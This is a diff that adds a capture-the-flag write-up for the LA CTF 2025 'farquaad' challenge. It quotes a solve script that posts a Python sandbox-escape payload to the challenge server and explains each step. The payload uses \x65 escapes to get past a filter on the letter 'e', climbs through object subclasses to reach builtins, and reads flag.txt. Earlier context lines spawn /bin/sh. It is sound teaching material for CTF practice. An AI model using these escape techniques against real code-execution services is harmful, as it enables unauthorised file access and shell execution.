@@ -132,3 +132,34 @@ p.sendline(b"import os")
 p.sendline(b'os.system("/bin/sh")')
 p.interactive()
 ```
+
+[Official writeup](https://github.com/uclaacm/lactf-archive/blob/main/2025/misc/farquaad/solve.py):
+
+```python
+import requests
+
+base = "http://localhost:3000"
+base = "https://farquaad.chall.lac.tf/"
+url = lambda end: f"{base.rstrip('/')}{end}"
+
+# below payload can be typed into web interface
+payload = r"""
+(o := ().__class__.__mro__[1], g := o.__dict__["__g\x65tattribut\x65__"], g(g(o, "__subclass\x65s__")()[138].__init__.__builtins__["op\x65n"]("flag.txt"), "r\x65ad")())[-1]
+""".strip()
+
+r = requests.post(url("/run"), json={"code": payload})
+print(r.json()["msg"])
+```
+
+Replace `e` with `\x65` in strings:
+
+```python
+>>> "\x65"
+'e'
+```
+
+Attack steps:
+
+1. `o := ().__class__.__mro__[1]`, o is `object`
+2. `g := o.__dict__["__g\x65tattribut\x65__"]`, g is `__getattribute__`
+3. `g(g(o, "__subclass\x65s__")()[138].__init__.__builtins__["op\x65n"]("flag.txt"), "r\x65ad")()` is `file = __getattribute__(object, "__subclasses__")()[138].__init__.__builtins__["open"]("flag.txt")` and `__getattribute__(file, "read")()`
